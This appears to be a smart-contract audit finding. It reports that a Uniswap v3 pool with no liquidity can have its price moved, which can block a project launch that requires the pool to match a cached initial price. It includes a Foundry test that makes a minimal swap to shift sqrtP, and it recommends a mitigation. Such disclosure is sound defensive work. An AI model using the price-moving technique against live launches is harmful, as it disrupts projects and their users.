# Vulnerability details

## Impact

It is required that univ3 pool price must equal to the cached initial pool price which is set in project initialization. However, in case the univ3 pool is created and there is no liquidity in the pool, it is possible to move the pool price.
So far, the issue can prevent the project from being launched

## Proof of Concept

The poc that an it is possible to manipulate an univ3 pool price which has no liquidity
```solidity
  function test_univ3_sqrtP() public {
    // assume that mock pool is just created with no liquidity

    // pre condition
    assertEq(_poolState().sqrtP, 2 ** 96); // init sqrtP
    assertEq(mockPool.liquidity(), 0);

    mockPool.swap({
      recipient: address(this),
      zeroForOne: true,
      amountSpecified: 1,
      sqrtPriceLimitX96: MIN_SQRTP + 1,
      data: new bytes(0)
    });

    // post condition
    assertNotEq(_poolState().sqrtP, 2 ** 96); // sqrtP changed
  }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Consider adding logic to do swap with pool to move the pool price to the initial pool price when the price is not equal to the initial price
